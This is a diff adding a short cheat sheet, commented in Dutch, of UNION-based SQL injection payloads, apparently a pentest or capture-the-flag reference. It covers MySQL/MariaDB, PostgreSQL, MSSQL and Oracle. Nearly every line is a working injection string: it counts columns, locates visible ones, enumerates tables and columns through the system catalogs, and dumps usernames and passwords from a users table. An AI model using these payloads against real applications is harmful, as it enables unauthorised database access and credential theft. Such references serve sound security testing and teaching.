@@ -1,0 +1,24 @@
+# SQL Injection - UNION-Based (meerdere databases)
+# Stap 1: Aantal kolommen bepalen
+' ORDER BY 1-- -
+' ORDER BY 2-- -
+# (verhoog tot error -> vorige = juiste aantal)
+# Of met NULL:
+' UNION SELECT NULL-- -
+' UNION SELECT NULL,NULL-- -
+# Stap 2: Zichtbare kolommen vinden
+' UNION SELECT 'a','b','c',4-- -
+# === MySQL / MariaDB ===
+' UNION SELECT 1,group_concat(table_name),3,4 FROM information_schema.tables WHERE table_schema=database()-- -
+' UNION SELECT 1,group_concat(column_name),3,4 FROM information_schema.columns WHERE table_name='users'-- -
+' UNION SELECT 1,username,password,4 FROM users-- -
+# Collation fix (MariaDB): ... COLLATE utf8mb4_general_ci FROM ...
+# === PostgreSQL ===
+' UNION SELECT 1,string_agg(table_name,','),3,4 FROM information_schema.tables WHERE table_schema='public'-- -
+' UNION SELECT 1,username,password,4 FROM users-- -
+# === MSSQL ===
+' UNION SELECT 1,name,3,4 FROM sysobjects WHERE xtype='U'-- -
+' UNION SELECT 1,name,3,4 FROM syscolumns WHERE id=(SELECT id FROM sysobjects WHERE name='users')-- -
+# === Oracle ===
+' UNION SELECT NULL,table_name,NULL FROM all_tables WHERE owner='SCHEMA'-- -
+# Tip: Oracle vereist FROM in elke SELECT: UNION SELECT 1,2 FROM dual
